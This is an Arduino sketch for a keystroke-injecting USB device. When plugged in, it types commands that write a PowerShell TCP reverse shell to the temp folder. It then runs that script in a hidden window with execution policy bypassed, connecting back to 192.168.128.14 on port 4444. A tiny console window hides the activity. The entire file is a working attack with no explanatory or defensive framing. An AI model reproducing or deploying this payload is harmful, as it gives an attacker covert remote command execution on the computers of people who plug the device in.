#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Powershell Reverse Shell
  delay(6000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mode con:cols=18 lines=1");

  typeKey(KEY_RETURN);

  Keyboard.print("echo Param([string]$IP,[string]$PORT);$client = New-Object System.Net.Sockets.TCPClient(\"$IP\",$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..255^|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2^>^&1 ^| Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()>%temp%\\shell.ps1");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"& '%temp%\\shell.ps1' 192.168.128.14 4444\"");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}